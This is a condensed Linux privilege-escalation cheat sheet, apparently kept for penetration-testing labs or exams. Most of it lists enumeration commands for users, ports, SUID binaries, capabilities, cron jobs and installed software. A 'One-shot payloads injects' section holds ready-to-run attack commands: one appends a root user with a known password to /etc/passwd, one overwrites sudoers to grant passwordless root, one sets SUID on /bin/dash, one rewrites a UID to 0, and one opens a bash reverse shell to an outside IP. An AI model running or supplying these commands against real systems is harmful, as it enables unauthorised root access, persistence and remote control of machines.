### Linux Privilege Escalation (Condensed version of notes/linux_privesc.md)

```bash
hostname && whoami && /usr/bin/cat proof.txt && ip a
```

```bash
# Proper shell
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")' ; export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp:/snap/bin ; export TERM=xterm-256color ; alias ll='ls -lsaht --color=auto'
hostname && whoami && ip a && python3 -c 'import pty; pty.spawn("/bin/bash")' ; export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp:/snap/bin ; export TERM=xterm-256color ; alias ll='ls -lsaht --color=auto'
# Ctrl + Z (Background Process)
stty raw -echo ; fg ; reset
stty columns 200 rows 200

/dev/shm/shell80&
./flare.sh # Checks for the files you're looking for
./pspy -pf
./linpeas.sh

# Basic
id ; env ; hostname ; cat /etc/issue ; cat /etc/os-release ; uname -a ;
systemctl show-environment # show system path

# Users
getent passwd | grep -v 'sshd' | grep 'sh\|:0:' --color
getent group

# Ports
( ip a || ifconfig )
( netstat -punta || ss -nltpu || netstat -anv ) | grep -i listen 2>/dev/null
netstat -punta | grep -E ':3389|:3350'
ps -fp $pid

# Pray
sudo -l

# SUIDs and GUIDs
ll $(find / -perm -u=s -type f 2>/dev/null ) && ll $(find / -perm -g=s -type f 2>/dev/null )

# Capabilities
/usr/sbin/getcap -r / 2>/dev/null

# Crontabs
crontab -l
sudo crontab -l
crontab -l -u $user
ll -R /etc/cron* /var/spool/cron*
cat /etc/cron* /etc/cron*/* /var/spool/cron/* /var/spool/cron/*/*

# Outdated software
apt list --upgradable
dpkg -l
lsmod
/sbin/modinfo libata

# MySQL,
mysql --version

# Available compilers
dpkg --list 2>/dev/null| grep compiler |grep -v decompiler 2>/dev/null && yum list installed 'gcc*' 2>/dev/null| grep gcc 2>/dev/null

# One-shot payloads injects
echo "hehe:$(openssl passwd LuLZ):0:0:root:/root:/bin/bash" >> /etc/passwd
chmod 4777 /bin/dash ; /bin/dash -p
echo 'profiler ALL=(root) NOPASSWD: ALL' > /etc/sudoers
bash -i >& /dev/tcp/192.168.45.178/80 0>&1
sed -i s/1001/0/g /etc/passwd

# File enumeration
grep "CRON" /var/log/syslog

# Modified in last 10 minutes
find / -type f -mmin -10 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/var/lib/*" ! -path "/private/var/*" -printf '%T+ %p\n' 2>/dev/null | head -100 | sort -r

# What's been modified after..
touch -t 202401031231.43 /tmp/wotsit
find / -newer /tmp/wotsit -print 2>/dev/null
```